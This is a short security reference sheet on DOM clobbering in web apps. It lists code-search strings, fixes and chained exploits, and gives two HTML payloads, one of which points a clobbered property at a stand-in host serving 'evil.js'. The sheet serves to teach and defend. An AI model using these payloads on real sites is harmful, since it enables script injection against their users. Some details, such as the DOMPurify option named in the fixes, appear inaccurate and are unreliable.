# DOM Clobbering — Modern Frameworks

**Tags:** #medium #xss #dom #javascript
**OWASP:** A01:2021-Broken Access Control / XSS
**CVSS Base:** 6.1 (Medium)

---

## 📖 What it is

DOM Clobbering is a technique where an attacker injects HTML (via a sanitization bypass or partial XSS) to overwrite global JavaScript variables or properties of the `document` object. This can lead to logical bypasses or secondary XSS when the application uses those variables.

---

## 🔍 `grep_search` Tactics

```
window.config
document.
id=
name=
innerHTML
outerHTML
DOMPurify.sanitize(
```

---

## 💣 Attack Category 1: Global Variable Hijacking

**How it works:** Browsers automatically create global variables for elements with an `id`. An attacker can inject an element to overwrite a configuration variable.

**Attack:**
```html
<img id="config">
```
In JS: `window.config` is now the `<img>` element instead of the intended object. If the app does `src = config.source || 'default.js'`, it might fail or pick up an attribute from the image.

---

## 💣 Attack Category 2: Multi-level Clobbering

**How it works:** Using the `name` attribute on certain elements (like `<a>`, `<img>`, `<form>`) to create nested properties.

**Attack:**
```html
<a id="foo"><a id="foo" name="bar" href="https://attacker.com/evil.js"></a></a>
```
In JS: `window.foo.bar` now points to the second `<a>` element. `foo.bar.href` will be the attacker's URL.

---

## 🛡️ Fix

1. **Namespace Isolation:** Avoid using global variables for configuration.
2. **Object.freeze():** Freeze configuration objects to prevent them from being overwritten.
3. **Strict Sanitization:** Use DOMPurify with `NAMESPACE_ISOLATION: true`.
4. **Validation:** Check the type of variables before using them: `if (typeof config !== 'object') ...`.

---

## 🔗 Chain Exploits

```
DOM Clobbering + Template Engine ➔ XSS via hijacked template URL
DOM Clobbering + Sanitizer bypass ➔ Persistent logical corruption
```
